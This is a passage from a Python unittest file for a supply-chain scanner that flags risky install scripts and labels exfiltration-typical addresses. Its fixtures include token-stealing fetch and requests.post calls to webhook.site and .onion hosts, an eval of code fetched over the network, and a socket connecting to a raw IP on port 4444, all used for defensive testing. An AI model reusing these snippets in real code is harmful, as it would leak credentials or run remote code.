                (root / "install.js").write_text(("require('./shim.js');\n" if mode == "other_file" else "") + text, encoding="utf-8")
                hooks = [i for i in core.scan_project(tmp)["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
                self.assertTrue(hooks)
                self.assertEqual({i["sev"] for i in hooks}, {"CRITICAL"})
                self.assertTrue(any("/data/list" in i["msg"] for i in hooks))

    def test_a_fetch_the_code_puts_on_the_global_object(self):
        # (the review's HIGH-1: a shim the code installs is what the call reaches)
        for install in ("globalThis.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
                        "window.fetch = function (p) { return fs.readFileSync(p, 'utf8'); };\n",
                        "global.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
                        "self.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
                        "Object.assign(globalThis, { fetch: (p) => fs.readFileSync(p, 'utf8') });\n",
                        "Object.defineProperty(globalThis, 'fetch', { value: function fetch(p) { return fs.readFileSync(p, 'utf8'); } });\n"):
            text = self.TOP + install + "function go() {\n  const v = fetch('/etc/hostname');\n" + self.SEND + "}\ngo();\n"
            with self.subTest(install):
                self.assertEqual(core.install_script_risk(text, lang="js"), [self.SENT.format("/etc/hostname")])
        fallback = self.helper("customFetch", "customFetch ?? fetch", self.STORE + "globalThis.fetch = (k) => k;\n")
        self.assertEqual(core.install_script_risk(fallback, lang="js"), [self.SENT.format("/data/list")])

    def test_an_options_object_of_the_codes_own(self):
        # (the review's HIGH-2: a class instance, a class's static method, a member defined, an object of entries)
        for defs, call in (("class Src { fetch(k) { return k; } }\n", "get('/data/list', new Src())"),
                           ("class Src { static fetch(k) { return k; } }\n", "get('/data/list', Src)"),
                           ("const d = {};\nObject.defineProperty(d, 'fetch', { value: function fetch(k) { return k; } });\n",
                            "get('/data/list', d)"),
                           ("const mine = function fetch(k) { return k; };\n", "get('/data/list', Object.fromEntries([['fetch', mine]]))"),
                           ("", "get('/data/list', { fetch: (k) => k })")):
            with self.subTest(call):
                self.assertEqual(core.install_script_risk(self.helper("opts", "opts.fetch ?? globalThis.fetch", defs, call), lang="js"),
                                 [self.SENT.format("/data/list")])

    def test_unproven_readings_stand(self):
        # a call gives the parameter a function, or Store is instantiated: what the parameter or the global holds is
        # not proven, so the reading by name stands, as 01f8e6b read it (here through Store's method)
        for defs, call in (("function readList(k) { return k; }\n", "get('/data/list', readList)"),
                           ("const s = new Store();\n", "get('/data/list')")):
            with self.subTest(call):
                text = self.helper("customFetch", "customFetch ?? fetch", self.STORE + defs, call)
                self.assertEqual(core.install_script_risk(text, lang="js"), [self.SENT.format("/data/list")])

    def test_what_the_fallback_receives_is_received(self):
        text = (self.STORE + "function load(customFetch) {\n  const fetchFn = customFetch ?? fetch;\n"
                "  return fetchFn('https://files.invalid/p').then((r) => r.text()).then((t) => eval(t));\n}\nload();\n")
        self.assertIn("runs code it receives over the network", core.install_script_risk(text, lang="js"))


class AddressLabelTests(unittest.TestCase):
    """D-22 (0.1.9): an address label (where a send goes, and a raw IP address, a reason of its own) is read in the
    code, its comments (and Python's docstrings) blanked: inspect-ai's view bundle "contacts an address typical of
    data exfiltration (.onion)" from linkify-it's doc comment (`.tlds('onion', true)`, the unofficial `.onion`
    domain), named once a send was found. Reworked after an independent review: only where no code may read that
    prose back. Twin of exfiltration.test.js's."""

    LABEL = "contacts an address typical of data exfiltration ({})"
    SENT = "sends environment variables over the network (NPM_TOKEN)"

    def labels(self, text, lang):
        return [r for r in core.install_script_risk(text, lang=lang) if r.startswith(self.LABEL[:30])]

    def js(self, host):
        return f"const v = process.env.NPM_TOKEN;\nfetch('{host}/c', {{ method: 'POST', body: v }});\n"

    def py(self, host):
        return f"import os, requests\nrequests.post('{host}/c', data=os.environ['NPM_TOKEN'])\n"

    def test_a_comments_address_is_no_label(self):
        send = self.js("https://collect.invalid")
        self.assertEqual(core.install_script_risk(send, lang="js"), [self.SENT])
        for comment in ("// linkify.tlds('onion', true) // add the unofficial `.onion` domain\n",
                        "/* a capture service for tests: https://webhook.site/0000 */\n",
                        "// a mirror: http://203.0.113.9/files\n"):
            with self.subTest(comment):
                self.assertEqual(self.labels(comment + send, "js"), [])
                self.assertEqual(self.labels("#!/usr/bin/env node\n" + comment + send, None), [])
        for prose in ("# results also go to https://webhook.site/0000\n", '"""Uploads to pipedream.net when asked."""\n',
                      "# a mirror: http://203.0.113.9/files\n"):
            with self.subTest(prose):
                self.assertEqual(self.labels(prose + self.py("https://collect.invalid"), "py"), [])

    def test_unknown_file_reads_and_failed_python_keep_raw_text(self):
        cases = [('js',
          '// http://203.0.113.9/p\n'
          'const fs=require("fs");const name=["install","js"].join(".");const '
          'u=fs.readFileSync(name,"utf8").split("\\n")[0].slice(3);require("http").get(u);'),
         ('js',
          '// http://203.0.113.9/p\n'
          'const fs=require("fs");const [,name]=process.argv;const '
          'u=fs.readFileSync(name,"utf8");require("http").get(u);'),
         ('js',
          '// http://203.0.113.9/p\n'
          'const f=require("fs");const r=f["read"+"FileSync"];require("http").get(r(name,"utf8"));'),
         ('py',
          '# http://203.0.113.9/p\n'
          'import sys, urllib.request\n'
          'u=open(sys.argv[:1][0]).readline()[2:].strip()\n'
          'urllib.request.urlopen(u)'),
         ('py',
          '# http://203.0.113.9/p\n'
          'import urllib.request\n'
          'u=open(".".join(["install","py"])).readline()[2:].strip()\n'
          'urllib.request.urlopen(u)'),
         ('py', '# http://203.0.113.9/p\nx = ('),
         ('py', '# http://203.0.113.9/p\nx = "unterminated')]
        for lang, text in cases:
            with self.subTest(lang=lang, text=text):
                self.assertIn(self.LABEL.format("http://203.0.113.9"), core.install_script_risk(text, lang=lang))

    def test_the_codes_address_is_one(self):
        for text, lang, shown in ((self.js("https://abcdefghijklmnop.onion"), "js", ".onion"),
                                  (self.js("https://webhook.site"), "js", "webhook.site"),
                                  (self.js("http://203.0.113.9"), "js", "http://203.0.113.9"),
                                  ("const doc = 'see example.onion';\n" + self.js("https://collect.invalid"), "js", ".onion"),
                                  ("/* tests: https://webhook.site/0000 */\n" + self.js("https://abcdefghijklmnop.onion"), "js",
                                   ".onion"),
                                  (self.py("https://webhook.site"), "py", "webhook.site"),
                                  (self.py("http://203.0.113.9"), "py", "http://203.0.113.9")):
            with self.subTest(shown):
                self.assertEqual(self.labels(text, lang), [self.LABEL.format(shown)])

    def test_prose_the_code_reads_back(self):
        # reworked after an independent review (its HIGH-3): a text that may read its prose back is read as it is —
        # a docstring read back, a function's source (JavaScript keeps a function's comments wherever its source is
        # read), its own file. The raw IP address is a reason of its own: no send is needed.
        ip = [self.LABEL.format("http://203.0.113.9")]
        doc = 'def where():\n    """http://203.0.113.9/p"""\n'
        tail = "\nconst u = where.toString().slice(23, -3);\nrequire('http').get(u);\n"
        for text, lang in (("import urllib.request\n" + doc + "urllib.request.urlopen(where.__doc__)\n", "py"),
                           ('import urllib.request\nclass Cfg:\n    """http://203.0.113.9/p"""\nurllib.request.urlopen(Cfg.__doc__)\n', "py"),
                           ("import inspect, urllib.request\n" + doc + "urllib.request.urlopen(inspect.getdoc(where))\n", "py"),
                           ("# http://203.0.113.9/p\nimport urllib.request\nurllib.request.urlopen(open(__file__).readline()[2:].strip())\n", "py"),
                           ("function where() {/*http://203.0.113.9/p*/}" + tail, "js"),
                           ("function where() {/*http://203.0.113.9/p*/}" + tail.replace("where.toString()", "String(where)"), "js"),
                           ("function where() {/*http://203.0.113.9/p*/}" + tail.replace("where.toString()", "`${where}`"), "js"),
                           ("// http://203.0.113.9/p\nconst fs = require('fs');\n"
                            "const u = fs.readFileSync('install.js', 'utf8').split('\\n')[0].slice(3);\nrequire('http').get(u);\n", "js")):
            with self.subTest(text):
                self.assertEqual(self.labels(text, lang), ip)
        sock = 'import socket\ndef where():\n    """203.0.113.9"""\ns = socket.socket()\ns.connect((where.__doc__, 4444))\n'
        self.assertEqual(core.install_script_risk(sock, lang="py"), [self.LABEL.format("203.0.113.9")])
        env = ('import os, requests\ndef where():\n    """https://webhook.site/0000"""\n'
               "requests.post(where.__doc__, data=os.environ['NPM_TOKEN'])\n")
        self.assertEqual(self.labels(env, "py"), [self.LABEL.format("webhook.site")])


if __name__ == "__main__":
    unittest.main()
